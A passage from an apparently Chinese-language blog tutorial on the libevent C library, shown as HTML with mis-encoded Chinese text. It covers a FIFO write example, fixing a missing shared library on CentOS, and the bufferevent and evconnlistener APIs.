class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;event2/event.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">write_cb</span><span class="params">(<span class="keyword">evutil_socket_t</span> fd,short what,<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//å†™ç®¡é“</span></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">1024</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> num = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">sprintf</span>(buf,<span class="string">"hello,world-%d\n"</span>,num++);</span><br><span class="line">write(fd,buf,<span class="built_in">strlen</span>(buf)+<span class="number">1</span>);</span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å†™ç®¡é“</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">const</span> <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> fd = open(<span class="string">"myfifo"</span>,O_WRONLY | O_NONBLOCK);</span><br><span class="line"><span class="keyword">if</span>(fd == <span class="number">-1</span>)&#123;</span><br><span class="line">perror(<span class="string">"open error"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//åˆ›å»ºä¸€ä¸ªevent_base</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">event_base</span> *<span class="title">base</span> = <span class="title">NULL</span>;</span></span><br><span class="line">base = event_base_new();</span><br><span class="line"></span><br><span class="line"><span class="comment">//åˆ›å»ºäº‹ä»¶</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">event</span> *<span class="title">ev</span> = <span class="title">NULL</span>;</span></span><br><span class="line">ev = event_new(base,fd,EV_WRITE|EV_PERSIST,write_cb,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//æ·»åŠ äº‹ä»¶</span></span><br><span class="line">event_add(ev,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//äº‹ä»¶å¾ªç¯</span></span><br><span class="line">event_base_dispatch(base);</span><br><span class="line"></span><br><span class="line"><span class="comment">//é‡Šæ”¾èµ„æº</span></span><br><span class="line">event_free(ev);</span><br><span class="line">event_base_free(base);</span><br><span class="line">close(fd);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨macä¸Šç¼–è¯‘æ‰§è¡Œä¹‹åå‘ç°å¹¶æ²¡æœ‰æ‰“å°ç»“æœï¼Œ<code>gdb</code>è°ƒè¯•ä¸€ä¸‹ï¼Œå‘ç°å¡åœ¨äº†<code>dispatch</code>è¿™é‡Œï¼Œ<code>dispatch</code>å‡½æ•°å°±ç›¸å½“äºæ˜¯<code>while+select/poll/epoll</code>è¿™ç§å½¢å¼ï¼Œå¯¹äº<code>libevent</code>åº“é»˜è®¤ä½¿ç”¨çš„æ˜¯<code>epoll</code>ï¼Œç„¶è€Œ<code>epoll</code>å¯¹äºmacæ˜¯ä¸æ”¯æŒçš„ã€‚</p><p><img src="/2021/11/19/æµ…å­¦libevent/4.png" alt="4"></p><p>äºæ˜¯æˆ‘æŠŠä»£ç æ”¾åˆ°äº†<code>centos</code>æœåŠ¡å™¨ä¸Šï¼Œ<code>./read_fifo</code>è¿è¡ŒæŠ¥é”™å¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error <span class="keyword">while</span> loading shared libraries: libevent<span class="number">-2.1</span>.so<span class="number">.6</span>: cannot open shared object file: No such file <span class="keyword">or</span> directory</span><br></pre></td></tr></table></figure><p>lddæŸ¥çœ‹ä¾èµ–å‘ç°æ²¡æœ‰æ‰¾åˆ°<code>libevent-2.1.so.6</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">elssm@VM<span class="number">-20</span><span class="number">-13</span>-centos ~/event&gt; ldd read_fifo</span><br><span class="line">linux-vdso.so<span class="number">.1</span> =&gt;  (<span class="number">0x00007ffcbc5f7000</span>)</span><br><span class="line">/$LIB/libonion.so =&gt; /lib64/libonion.so (<span class="number">0x00007fda57d92000</span>)</span><br><span class="line">libevent<span class="number">-2.1</span>.so<span class="number">.6</span> =&gt; <span class="keyword">not</span> found</span><br><span class="line">libc.so<span class="number">.6</span> =&gt; /lib64/libc.so<span class="number">.6</span> (<span class="number">0x00007fda57657000</span>)</span><br><span class="line">libdl.so<span class="number">.2</span> =&gt; /lib64/libdl.so<span class="number">.2</span> (<span class="number">0x00007fda57453000</span>)</span><br><span class="line">libcrypto.so<span class="number">.10</span> =&gt; /lib64/libcrypto.so<span class="number">.10</span> (<span class="number">0x00007fda56ff0000</span>)</span><br><span class="line">libpthread.so<span class="number">.0</span> =&gt; /lib64/libpthread.so<span class="number">.0</span> (<span class="number">0x00007fda56dd4000</span>)</span><br><span class="line">/lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span> (<span class="number">0x00007fda57c79000</span>)</span><br><span class="line">libz.so<span class="number">.1</span> =&gt; /lib64/libz.so<span class="number">.1</span> (<span class="number">0x00007fda56bbe000</span>)</span><br></pre></td></tr></table></figure><p>åˆ›å»ºè½¯é“¾æ¥å¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ln -s /usr/lib/libevent<span class="number">-2.1</span>.so<span class="number">.6</span> /usr/lib64/libevent<span class="number">-2.1</span>.so<span class="number">.6</span></span><br></pre></td></tr></table></figure><p>å†æ¬¡æŸ¥çœ‹ä¾èµ–</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">elssm@VM<span class="number">-20</span><span class="number">-13</span>-centos ~/event&gt; ldd read_fifo</span><br><span class="line">linux-vdso.so<span class="number">.1</span> =&gt;  (<span class="number">0x00007ffcbc5f7000</span>)</span><br><span class="line">/$LIB/libonion.so =&gt; /lib64/libonion.so (<span class="number">0x00007fda57d92000</span>)</span><br><span class="line">libevent<span class="number">-2.1</span>.so<span class="number">.6</span> =&gt; /lib64/libevent<span class="number">-2.1</span>.so<span class="number">.6</span> (<span class="number">0x00007fda57a25000</span>)</span><br><span class="line">libc.so<span class="number">.6</span> =&gt; /lib64/libc.so<span class="number">.6</span> (<span class="number">0x00007fda57657000</span>)</span><br><span class="line">libdl.so<span class="number">.2</span> =&gt; /lib64/libdl.so<span class="number">.2</span> (<span class="number">0x00007fda57453000</span>)</span><br><span class="line">libcrypto.so<span class="number">.10</span> =&gt; /lib64/libcrypto.so<span class="number">.10</span> (<span class="number">0x00007fda56ff0000</span>)</span><br><span class="line">libpthread.so<span class="number">.0</span> =&gt; /lib64/libpthread.so<span class="number">.0</span> (<span class="number">0x00007fda56dd4000</span>)</span><br><span class="line">/lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span> (<span class="number">0x00007fda57c79000</span>)</span><br><span class="line">libz.so<span class="number">.1</span> =&gt; /lib64/libz.so<span class="number">.1</span> (<span class="number">0x00007fda56bbe000</span>)</span><br></pre></td></tr></table></figure><p>ä¹‹ååˆ†åˆ«æ‰§è¡Œ<code>./read_fifo</code>å’Œ<code>./write_fifo</code>ã€‚å‘ç°æˆåŠŸè¯»å†™</p><p><img src="/2021/11/19/æµ…å­¦libevent/5.png" alt="5"></p><h4 id="äº‹ä»¶çš„æœªå†³å’Œéæœªå†³"><a href="#äº‹ä»¶çš„æœªå†³å’Œéæœªå†³" class="headerlink" title="äº‹ä»¶çš„æœªå†³å’Œéæœªå†³"></a>äº‹ä»¶çš„æœªå†³å’Œéæœªå†³</h4><ul><li>æœªå†³ï¼šæœ‰èµ„æ ¼è¢«å¤„ç†ï¼Œä½†å°šæœªè¢«å¤„ç†</li><li>éæœªå†³ï¼šæ²¡æœ‰èµ„æ ¼è¢«å¤„ç†</li></ul><p>äº‹ä»¶çš„æœªå†³å’Œéæœªå†³çŠ¶æ€è½¬æ¢å›¾å¦‚ä¸‹æ‰€ç¤º</p><p><img src="/2021/11/19/æµ…å­¦libevent/6.png" alt="6"></p><h4 id="bufferevent"><a href="#bufferevent" class="headerlink" title="bufferevent"></a>bufferevent</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;event2/bufferevent.h&gt;</span></span></span><br></pre></td></tr></table></figure><p><code>bufferevent</code>æœ‰ä¸¤ä¸ªç¼“å†²åŒºï¼Œä¹Ÿæ˜¯é˜Ÿåˆ—å®ç°ï¼Œå…ˆè¿›å…ˆå‡º</p><p>è¯»ï¼šæœ‰æ•°æ®â€”â€”&gt;è¯»å›è°ƒå‡½æ•°è¢«è°ƒç”¨â€”â€”-&gt;ä½¿ç”¨<code>bufferevent_read()</code>â€”â€”&gt;è¯»æ•°æ®</p><p>å†™ï¼šä½¿ç”¨<code>bufferevent_write()</code>â€”â€”-&gt;å‘å†™ç¼“å†²ä¸­å†™æ•°æ®â€”â€”-&gt;è¯¥ç¼“å†²åŒºæœ‰æ•°æ®è‡ªåŠ¨å†™å‡ºâ€”â€”&gt;å†™å®Œï¼Œå›è°ƒå‡½æ•°è¢«è°ƒç”¨</p><h4 id="buffereventåˆ›å»ºå’Œé‡Šæ”¾"><a href="#buffereventåˆ›å»ºå’Œé‡Šæ”¾" class="headerlink" title="buffereventåˆ›å»ºå’Œé‡Šæ”¾"></a>buffereventåˆ›å»ºå’Œé‡Šæ”¾</h4><p>åˆ›å»º<code>bufferevent</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bufferevent</span> *<span class="title">ev</span></span></span><br><span class="line"><span class="class"><span class="title">struct</span> <span class="title">bufferevent</span> *<span class="title">bufferevent_socket_new</span>(<span class="title">struct</span> <span class="title">event_base</span> *<span class="title">base</span>,<span class="title">evutil_socket_tfd</span>,<span class="title">enum</span> <span class="title">bufferevent_options</span> <span class="title">options</span>);</span></span><br><span class="line"></span><br><span class="line">base: event_base_newå‡½æ•°çš„è¿”å›å€¼</span><br><span class="line">fd: è·Ÿbuffereventç»‘å®šçš„æ–‡ä»¶æè¿°ç¬¦ç±»æ¯”event_new()</span><br><span class="line">options: BEV_OPT_CLOSE_ON_FREEåªç”¨è¿™ä¸€ä¸ªå³å¯</span><br><span class="line">   </span><br><span class="line">è¿”å›: æˆåŠŸåˆ›å»ºçš„buffereventäº‹ä»¶å¯¹è±¡</span><br></pre></td></tr></table></figure><p>é‡Šæ”¾<code>bufferevent</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bufferevent_free</span><span class="params">(struct bufferevent *bev)</span></span></span><br></pre></td></tr></table></figure><h4 id="ç»™è¯»å†™ç¼“å†²åŒºè®¾ç½®å›è°ƒ"><a href="#ç»™è¯»å†™ç¼“å†²åŒºè®¾ç½®å›è°ƒ" class="headerlink" title="ç»™è¯»å†™ç¼“å†²åŒºè®¾ç½®å›è°ƒ"></a>ç»™è¯»å†™ç¼“å†²åŒºè®¾ç½®å›è°ƒ</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bufferevent_setcb</span><span class="params">(struct bufferevent *bufev,bufferevent_data_cb readcb,bufferevent_data_cb writecb,bufferevent_event_cb eventcb,<span class="keyword">void</span> *cbarg)</span></span>;</span><br><span class="line"></span><br><span class="line">bufev: bufferevent_socket_new()å‡½æ•°çš„è¿”å›å€¼</span><br><span class="line">readcb:è¯»ç¼“å†²å¯¹åº”çš„å›è°ƒï¼Œè‡ªå·±å°è£…ï¼Œåœ¨å…¶å†…éƒ¨è¯»æ•°æ®</span><br><span class="line">  writecb:è®¾ç½®buffereventå†™ç¼“å†² ä¸ç”¨ï¼Œä¼ <span class="literal">NULL</span></span><br><span class="line">  eventcb: è®¾ç½®äº‹ä»¶å›è°ƒã€‚å¯ä¼ <span class="literal">NULL</span></span><br><span class="line">  cbarg: å›è°ƒå‡½æ•°ç”¨çš„å‚æ•°</span><br></pre></td></tr></table></figure><h5 id="readcbå¯¹åº”çš„å›è°ƒå‡½æ•°"><a href="#readcbå¯¹åº”çš„å›è°ƒå‡½æ•°" class="headerlink" title="readcbå¯¹åº”çš„å›è°ƒå‡½æ•°"></a>readcbå¯¹åº”çš„å›è°ƒå‡½æ•°</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span><span class="params">(*bufferevent_data_cb)</span><span class="params">(struct bufferevent *bev,<span class="keyword">void</span> *ctx)</span></span>;</span><br></pre></td></tr></table></figure><p>ä¾‹å¦‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read_cb</span><span class="params">(struct bufferevent *bev,<span class="keyword">void</span> *arg)</span></span>&#123;</span><br><span class="line">  ....</span><br><span class="line">  bufferevent_read();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">bufferevent_read</span><span class="params">(struct bufferevent *bufev,<span class="keyword">void</span> *data,<span class="keyword">size_t</span> size)</span></span>;</span><br><span class="line"><span class="comment">//é€šå¸¸ç”¨åœ¨readcbä¸­ï¼Œä»£æ›¿read()</span></span><br></pre></td></tr></table></figure><h5 id="writecbå¯¹åº”çš„å›è°ƒå‡½æ•°"><a href="#writecbå¯¹åº”çš„å›è°ƒå‡½æ•°" class="headerlink" title="writecbå¯¹åº”çš„å›è°ƒå‡½æ•°"></a>writecbå¯¹åº”çš„å›è°ƒå‡½æ•°</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">write_cb</span><span class="params">(struct bufferevent *bev,<span class="keyword">void</span> *arg)</span></span>&#123;</span><br><span class="line">  ....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bufferevent_write</span><span class="params">(struct bufferevent *bufev,<span class="keyword">const</span> <span class="keyword">void</span> *data,<span class="keyword">size_t</span> size)</span></span>;</span><br><span class="line"><span class="comment">//å¸¸ç”¨åœ¨bufferevent_readä¹‹åï¼Œä»£æ›¿write()</span></span><br></pre></td></tr></table></figure><h5 id="eventcbå¯¹åº”çš„å›è°ƒå‡½æ•°"><a href="#eventcbå¯¹åº”çš„å›è°ƒå‡½æ•°" class="headerlink" title="eventcbå¯¹åº”çš„å›è°ƒå‡½æ•°"></a>eventcbå¯¹åº”çš„å›è°ƒå‡½æ•°</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span><span class="params">(*bufferevent_event_cb)</span><span class="params">(struct bufferevent *bev,short events,<span class="keyword">void</span> *ctx)</span></span>;</span><br><span class="line"></span><br><span class="line">events: ä¸åŒæ ‡å¿—ä½ï¼Œä»£è¡¨ä¸åŒçš„äº‹ä»¶</span><br><span class="line">  BEV_EVENT_READING: è¯»å–æ“ä½œæ—¶å‘ç”ŸæŸäº‹ä»¶ï¼Œå…·ä½“æ˜¯å“ªç§äº‹ä»¶ï¼Œçœ‹å…¶ä»–æ ‡å¿—</span><br><span class="line">  BEV_EVENT_WRITING: å†™å…¥æ“ä½œæ—¶å‘ç”ŸæŸäº‹ä»¶ï¼Œå…·ä½“æ˜¯å“ªç§äº‹ä»¶ï¼Œçœ‹å…¶ä»–æ ‡å¿—</span><br><span class="line">  BEV_EVENT_ERROR: æ“ä½œæ—¶å‘ç”Ÿé”™è¯¯</span><br><span class="line">  BEV_EVENT_TIMEOUT: å‘ç”Ÿè¶…æ—¶</span><br><span class="line">  BEV_EVENT_EOF: é‡åˆ°æ–‡ä»¶ç»“æŸæŒ‡ç¤º</span><br><span class="line">  BEV_EVENT_CONNECTED: è¯·æ±‚çš„è¿æ¥è¿‡ç¨‹å·²ç»å®Œæˆï¼Œå®ç°å®¢æˆ·ç«¯æ—¶å¯ç”¨</span><br></pre></td></tr></table></figure><h4 id="ç¦ç”¨å’Œå¯ç”¨ç¼“å†²åŒº"><a href="#ç¦ç”¨å’Œå¯ç”¨ç¼“å†²åŒº" class="headerlink" title="ç¦ç”¨å’Œå¯ç”¨ç¼“å†²åŒº"></a>ç¦ç”¨å’Œå¯ç”¨ç¼“å†²åŒº</h4><p>é»˜è®¤ï¼šæ–°å»ºçš„<code>bufferevent</code>å†™ç¼“å†²æ—¶<code>enable</code>çš„ï¼Œè€Œè¯»ç¼“å†²æ˜¯<code>disable</code>çš„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bufferevent_enable</span><span class="params">(struct bufferevent *bufev,short events)</span></span>;</span><br><span class="line"><span class="comment">//é€šå¸¸ç”¨æ¥å¯ç”¨buffereventçš„readç¼“å†²</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bufferevent_disable</span><span class="params">(struct bufferevent *bufev,short events)</span></span>; <span class="comment">//ç¦ç”¨</span></span><br><span class="line"></span><br><span class="line">events: EV_READã€EV_WRITEã€EV_READï½œEV_WRITE</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">short <span class="title">bufferevent_get_enabled</span><span class="params">(struct bufferevent *bufev)</span></span>;</span><br><span class="line"><span class="comment">//è·å–ç¼“å†²åŒºçš„ç¦ç”¨çŠ¶æ€ï¼Œéœ€è¦å€ŸåŠ©&amp;æ¥å¾—åˆ°</span></span><br></pre></td></tr></table></figure><h4 id="å®¢æˆ·ç«¯è¿æ¥æœåŠ¡å™¨"><a href="#å®¢æˆ·ç«¯è¿æ¥æœåŠ¡å™¨" class="headerlink" title="å®¢æˆ·ç«¯è¿æ¥æœåŠ¡å™¨"></a>å®¢æˆ·ç«¯è¿æ¥æœåŠ¡å™¨</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bufferevent_socket_connect</span><span class="params">(struct bufferevent *bev,struct sockaddr *address,<span class="keyword">int</span> addrlen)</span></span>;</span><br><span class="line"></span><br><span class="line">bev: buffereventäº‹ä»¶å¯¹è±¡(å°è£…äº†fd)</span><br><span class="line">  address: åœ°å€ç»“æ„</span><br><span class="line">  addrlen: åœ°å€é•¿åº¦</span><br></pre></td></tr></table></figure><h4 id="æœåŠ¡å™¨åˆ›å»ºç›‘å¬å™¨"><a href="#æœåŠ¡å™¨åˆ›å»ºç›‘å¬å™¨" class="headerlink" title="æœåŠ¡å™¨åˆ›å»ºç›‘å¬å™¨"></a>æœåŠ¡å™¨åˆ›å»ºç›‘å¬å™¨</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;event2/listener.h&gt;</span></span></span><br><span class="line"><span class="function">struct evconnlistener * <span class="title">evconnlistener_new</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">struct event_base *base,</span></span></span><br><span class="line"><span class="function"><span class="params">  evconnlistener_cb cb,</span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">void</span> *ptr,</span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">unsigned</span> flags,</span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">int</span> backlog,</span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">evutil_socket_t</span> fd</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">evconnlistener</span> *<span class="title">listener</span></span></span><br><span class="line"><span class="class"><span class="title">struct</span> <span class="title">evconnlistener</span> *<span class="title">evconnlistener_new_bind</span>(</span></span><br><span class="line"><span class="class"><span class="title">struct</span> <span class="title">event_base</span> *<span class="title">base</span>,</span></span><br><span class="line"><span class="class">  <span class="title">evconnlistener_cb</span> <span class="title">cb</span>,</span></span><br><span class="line"><span class="class">  <span class="title">void</span> *<span class="title">ptr</span>,</span></span><br><span class="line"><span class="class">  <span class="title">unsigned</span> <span class="title">flags</span>,</span></span><br><span class="line"><span class="class">  <span class="title">int</span> <span class="title">backlog</span>,</span></span><br><span class="line"><span class="class">  <span class="title">const</span> <span class="title">struct</span> <span class="title">sockaddr</span> *<span class="title">sa</span>,</span></span><br><span class="line"><span class="class">  <span class="title">int</span> <span class="title">socklen</span></span></span><br><span class="line"><span class="class">);</span></span><br><span class="line"></span><br><span class="line">cb: ç›‘å¬å›è°ƒå‡½æ•°ï¼Œæ¥å—è¿æ¥ä¹‹åç”¨æˆ·è¦åšçš„æ“ä½œ</span><br><span class="line">  ptr: å›è°ƒå‡½æ•°çš„å‚æ•°</span><br><span class="line">flags: â€œå¯è¯†åˆ«çš„æ ‡å¿—â€</span><br><span class="line">    LEV_OPT_CLOSE_ON_FREE: é‡Šæ”¾buffereventæ—¶å…³é—­åº•å±‚ä¼ è¾“ç«¯å£ï¼Œè¿™å°†å…³é—­åº•å±‚å¥—æ¥å­—ï¼Œé‡Šæ”¾åº•å±‚bufferevent</span><br><span class="line">    LEV_OPT_REUSEABLE: ç«¯å£å¤ç”¨ï¼Œå¯ä»¥<span class="string">"|"</span></span><br><span class="line">  backlog: listen()å‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°ï¼Œä¼ <span class="number">-1</span>è¡¨ç¤ºä½¿ç”¨é»˜è®¤æœ€å¤§å€¼</span><br><span class="line">  sa: æœåŠ¡å™¨è‡ªå·±çš„åœ°å€ç»“æ„ä½“ï¼ŒIP+Port</span><br><span class="line">  socklen: æœåŠ¡å™¨è‡ªå·±çš„åœ°å€ç»“æ„ä½“å¤§å°</span><br><span class="line"></span><br><span class="line">è¿”å›å€¼: æˆåŠŸåˆ›å»ºçš„ç›‘å¬å™¨</span><br></pre></td></tr></table></figure><h5 id="å›è°ƒå‡½æ•°ç±»å‹"><a href="#å›è°ƒå‡½æ•°ç±»å‹" class="headerlink" title="å›è°ƒå‡½æ•°ç±»å‹"></a>å›è°ƒå‡½æ•°ç±»å‹</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span><span class="params">(*evconnlistener_cb)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">struct evconnlistener *listener,</span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">evutil_socket_t</span> sock,</span></span></span><br><span class="line"><span class="function"><span class="params">  struct sockaddr *addr,</span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">int</span> len,</span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">void</span> *ptr</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br><span class="line"></span><br><span class="line">listener: evconnlistener_new_bindå‡½æ•°çš„è¿”å›å€¼</span><br><span class="line">sock: ç”¨äºé€šä¿¡çš„æ–‡ä»¶æè¿°ç¬¦</span><br><span class="line">addr: å®¢æˆ·ç«¯çš„IP+ç«¯å£</span><br><span class="line">len: addrçš„len</span><br><span class="line">ptr: å¤–éƒ¨pträ¼ é€’è¿›æ¥çš„å€¼</span><br></pre></td></tr></table></figure><h4 id="é‡Šæ”¾ç›‘å¬æœåŠ¡å™¨"><a href="#é‡Šæ”¾ç›‘å¬æœåŠ¡å™¨" class="headerlink" title="é‡Šæ”¾ç›‘å¬æœåŠ¡å™¨"></a>é‡Šæ”¾ç›‘å¬æœåŠ¡å™¨</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evconnlistener_free(listener);</span><br></pre></td></tr></table></figure><h4 id="æœåŠ¡ç«¯buffereventåˆ›å»ºTCPè¿æ¥æµç¨‹"><a href="#æœåŠ¡ç«¯buffereventåˆ›å»ºTCPè¿æ¥æµç¨‹" class="headerlink" 